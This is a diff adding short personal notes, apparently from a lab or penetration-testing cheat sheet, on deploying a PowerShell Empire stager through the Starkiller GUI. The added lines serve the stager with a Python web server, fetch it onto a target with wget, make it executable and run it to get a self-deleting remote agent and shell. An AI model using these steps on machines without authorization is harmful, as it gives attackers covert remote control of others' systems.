@@ -8,3 +8,18 @@ PowerShell Empire
 ---Create an http listener
 ---submit
 ---Next is creating a stager, this will be the code on the target reaching back to our server
+---Download the file and get it to yuor target machine in this case my stager is "launcher.sh"
+---start a python server on the directory the file lives
+#python3 -m http.server
+---go to target machine
+#wget hhtp://10.50.X.X:8000/launcher.sh
+#chmod 777 launcher.sh
+#./launcher.sh
+---now the file should run, self deleted and we have a uniquely named agent on the starkiller GUI
+You can use the same launcher file on different machines as long as they have the same OS
+once ran it will create a uniquely named agent
+
+----on STARKILLER
+----go to agents and click on the one you desire to interact
+----you can go to terminal and ask for shell for actual functionality
+
